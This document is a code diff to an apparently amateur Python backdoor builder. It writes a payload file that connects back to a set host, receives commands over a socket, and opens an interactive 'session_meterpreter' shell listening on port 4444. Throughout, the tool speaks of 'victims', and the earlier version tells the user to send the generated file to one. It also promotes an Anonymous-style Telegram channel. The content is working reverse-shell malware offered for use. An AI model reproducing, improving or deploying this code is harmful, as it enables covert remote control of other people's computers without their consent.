@@ -14,6 +14,8 @@ def banner():
 	print("")
 	print("Copyright : ph4mch13n")
 	print("Twitter : @Anonym0us_VNPC")
+	print("Tele : https://t.me/Anon0psNews")
+	print("Github : /Phamchie")
 
 banner()
 
@@ -21,8 +23,12 @@ print("")
 print("type help")
 print("")
 
-host = 'null bytes'
-port = 'null bytes'
+lhost = 'null bytes'
+lport = 'null bytes'
+
+rhost = 'null'
+rport = 'null'
+
 filename = 'null bytes '
 
 session = True
@@ -32,36 +38,50 @@ while session:
 	if text_main == "help":
 		print("")
 		print('''
-command                 options
+  command                 options
 ============================================  
-
-set filename            Created File Backdoor
-
-exploit                 run exploit victim
-
-set lhost               set ip victim
-
-set lport               set port victim
-
-options                 show options
+| set filename            Created File Backdoor
+|
+| exploit                 run exploit victim
+|
+| set lhost               set ip system attack
+| set lport               set port system attack
+|
+| set rhost               set ip victim
+|
+| options                 show options
+============================================
 ''')
 		print("")
 
 	elif text_main == "set lhost":
 		print("")
-		host = input("LHOST : ")
+		lhost = input("LHOST : ")
 		print("")
-		print(f"[*] set lhost : {host}")
-		print("[*] next step , set lport")
+		print(f"[*] set LHOST : {lhost}")
 		print("")
 
 	elif text_main == "set lport":
 		print("")
-		port = int(input("LPORT : "))
+		lport = input("LPORT : ")
 		print("")
-		print(f"[*] set lport : {port}")
-		print("[*] next step , set file name")
+		print(f"[*] set LPORT : {lport}")
 		print("")
+
+	elif text_main == "set rhost":
+		print("")
+		rhost = input("RHOST : ")
+		print("")
+		print(f"[*] set RHOST : {rhost}")
+		print("")
+
+	elif text_main == "set rport":
+		print("")
+		rport = input("RPORT : ")
+		print("")
+		print(f"[*] set RPORT : {rport}")
+		print("")
+
 
 	elif text_main == "set filename":
 		print("")
@@ -75,20 +95,24 @@ import os
 
 os.system('cls' if os.name == 'nt' else 'clear')
 
-ip = '{host}'
-port = {port}
+ip = '{rhost}'
+port = {rport}
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.connect((ip, port))
+s = socket.socket(socket.AF_INET, 
+	socket.SOCK_STREAM)
+
+s.setsockopt(socket.SOL_SOCKET, 
+	socket.SO_REUSEADDR, 
+	1)
+
+s.connect((ip, 
+	port))
 
 print('[+] Starting Setup Bottom...')
 time.sleep(20)
 print('[+] Waiting...')
 
 while True:
-	s.send(b'whoami')
-	s.send(b'pwd')
 	cmd = s.recv(1024)
 	if cmd == b'exit':
 		print("[+] Session Close")
@@ -111,14 +135,23 @@ while True:
 			file.write(code)
 
 		print(f"[*] set filename {filename}.py")
-		print(f"[*] now send to victim this file")
+
 		print("")
 
 	elif text_main == "options":
 		print(f'''
-LHOST  : {host}
-LPORT  : {port}
+=========================
+(SYSTEM IP)
+LHOST  : {lhost}
+LPORT  : {lport}
+
+(VICTIM IP)
+RHOST  : {rhost}
+RPORT  : {rport}
+
+(PATH FILE)
 FILEPATH : {filename}.py
+=========================
 ''')
 
 	elif text_main == "exploit":
@@ -126,29 +159,45 @@ FILEPATH : {filename}.py
 		import socket
 		import sys
 
-		IP = '0.0.0.0'
+		IP = f'{lhost}'
 		PORT = 4444
 
-		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-		s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+		s = socket.socket(socket.AF_INET,
+			socket.SOCK_STREAM)
+
+		s.setsockopt(socket.SOL_SOCKET, 
+			socket.SO_REUSEADDR, 
+			1)
+
 		s.bind((IP, PORT))
 		s.listen(1)
 
 
 		print("")
-		print('[+] Starting Service')
+		print(f'[+] Starting Reverse Handler On {IP}:{PORT}')
 		time.sleep(2)
-		print('[*] Service On....')
+  
+		print('[*] Startingthe payload backdoor...')
 		time.sleep(1)
-		print('[*] Server is listening on port '+ str(PORT) + ' ...')
+  
+		print('[*] Server is listening on '+ str(IP) + ":" + str(PORT) + '...')
 		conn, addr = s.accept()
-		print('[+] Connected to ', addr)
+  
+		print('[+] Connected Done From ', addr)
+		time.sleep(2)
+  
+		print("[+] Join Us : https://t.me/Anon0psNews/")
+		time.sleep(1)
+  
+		print("[+] session started...")
 
+		session_door = True
 
-		while True:
+		while session_door:
 
-		      sys.stdout.write("Shell >> ")
+		      sys.stdout.write("session_meterpreter > ")
 		      command = sys.stdin.readline()
+
 		      if command == 'exit\n':
 		          print('[+] Close')
 		          conn.send(b"exit")
@@ -158,4 +207,4 @@ FILEPATH : {filename}.py
 		      elif command != '\n':
 		          conn.send(command.encode())
 		          output = conn.recv(1024)
-		          print(output)
+		          print("\n", output, "\n")
